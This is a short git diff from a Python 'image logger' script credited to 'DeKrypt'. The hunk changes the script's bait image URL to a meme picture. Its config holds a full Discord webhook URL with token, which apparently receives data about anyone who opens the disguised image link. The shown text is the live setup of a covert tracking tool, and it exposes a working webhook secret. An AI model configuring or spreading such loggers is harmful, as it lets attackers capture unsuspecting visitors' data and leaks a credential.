@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1483196013371068538/5Cgi3Wl0fINF2kfh5cc3ap_zYfXxCxywF6vj02XIf7tNq62nDC9Y5dUWEaei625vpiQ3",
-    "image": "https://cdn.discordapp.com/attachments/1282412498305159360/1468997860208148570/image.png?ex=69b978de&is=69b8275e&hm=7922c1fa606a516570b38afced7a37453c5edd4dcfafafe630a53b5b7e16cc10&animated=true", # You can also have a custom image by using a URL argument
+    "image": "https://mediaproxy.tvtropes.org/width/1200/https://static.tvtropes.org/pmwiki/pub/images/megamindpeeking.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
